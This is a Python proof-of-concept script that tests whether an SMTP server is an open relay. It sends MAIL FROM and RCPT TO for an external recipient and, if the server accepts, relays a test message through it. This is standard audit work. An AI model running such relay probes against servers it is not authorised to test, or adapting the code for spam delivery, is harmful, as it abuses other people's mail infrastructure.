#!/usr/bin/env python3
"""
Proof-of-Concept: SMTP Open Relay via Missing Relay Policy Validation

This script demonstrates how an SMTP server can be exploited as an open relay
if it fails to validate whether the destination domain is local or if the
client is authorized to relay mail.

Reference: RFC 5321, Section 3.6.2 & 7.9
"""

import socket
import sys
import time

def send_command(sock, command, timeout=5):
    """Send an SMTP command and return the server's response."""
    sock.sendall((command + '\r\n').encode('utf-8'))
    sock.settimeout(timeout)
    try:
        response = b''
        while True:
            data = sock.recv(1024)
            if not data:
                break
            response += data
            # SMTP responses can be multi-line, ending with a space or hyphen after the code
            if response.endswith(b' \r\n') or response.endswith(b'-\r\n'):
                # Check if the last line is the final one (ends with space, not hyphen)
                lines = response.decode('utf-8', errors='ignore').split('\r\n')
                if lines[-2].endswith(' '):
                    break
        return response.decode('utf-8', errors='ignore')
    except socket.timeout:
        return "Timeout"
    except Exception as e:
        return f"Error: {str(e)}"

def check_open_relay(target_host, target_port=25, sender="attacker@example.com", recipient="victim@external-domain.com"):
    """
    Attempts to relay an email through the target server.
    If the server accepts the RCPT TO command for an external domain without authentication,
    it is likely an open relay.
    """
    print(f"[*] Connecting to {target_host}:{target_port}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_host, target_port))
        
        # Step 1: Receive initial banner
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        print(f"[+] Server Banner: {banner.strip()}")
        
        # Step 2: EHLO/HELO
        ehlo_resp = send_command(sock, f"EHLO poc-client.local")
        print(f"[+] EHLO Response: {ehlo_resp.strip()}")
        
        # Step 3: MAIL FROM
        mail_from_resp = send_command(sock, f"MAIL FROM:<{sender}>")
        print(f"[+] MAIL FROM Response: {mail_from_resp.strip()}")
        if not mail_from_resp.startswith('250'):
            print("[-] Server rejected MAIL FROM. Aborting.")
            sock.close()
            return False
        
        # Step 4: RCPT TO (Critical Step for Open Relay Detection)
        # If the server is properly configured, it should reject this with a 550 error
        # because the recipient is not local and the client is not authenticated/authorized.
        rcpt_to_resp = send_command(sock, f"RCPT TO:<{recipient}>")
        print(f"[+] RCPT TO Response: {rcpt_to_resp.strip()}")
        
        # Check for acceptance (250 code) vs rejection (550 code)
        if rcpt_to_resp.startswith('250'):
            print("[!] VULNERABLE: Server accepted RCPT TO for external domain. Likely an Open Relay.")
            # Optional: Send DATA and a dummy message to complete the transaction
            data_resp = send_command(sock, "DATA")
            if data_resp.startswith('354'):
                print("[+] Server accepted DATA command.")
                msg = "Subject: Open Relay Test\r\n\r\nThis is a test message to demonstrate open relay vulnerability.\r\n."
                send_command(sock, msg)
                print("[+] Message sent successfully.")
            sock.close()
            return True
        elif rcpt_to_resp.startswith('550'):
            print("[+] SECURE: Server rejected RCPT TO with 550 error. Relay policy is enforced.")
            sock.close()
            return False
        else:
            print(f"[?] Unexpected response: {rcpt_to_resp.strip()}")
            sock.close()
            return False
            
    except socket.error as e:
        print(f"[-] Connection error: {e}")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python poc_open_relay_via_missing_relay_policy_validation.py <target_host> [target_port]")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 25
    
    # Use a clearly external domain for the recipient
    recipient = "test@external-domain.com"
    sender = "attacker@malicious-domain.com"
    
    print(f"[*] Testing for Open Relay on {target_host}:{target_port}")
    print(f"[*] Sender: {sender}")
    print(f"[*] Recipient: {recipient}")
    print("-" * 50)
    
    is_vulnerable = check_open_relay(target_host, target_port, sender, recipient)
    
    if is_vulnerable:
        print("\n[RESULT] The server appears to be an OPEN RELAY.")
    else:
        print("\n[RESULT] The server appears to be SECURE against open relay attempts.")
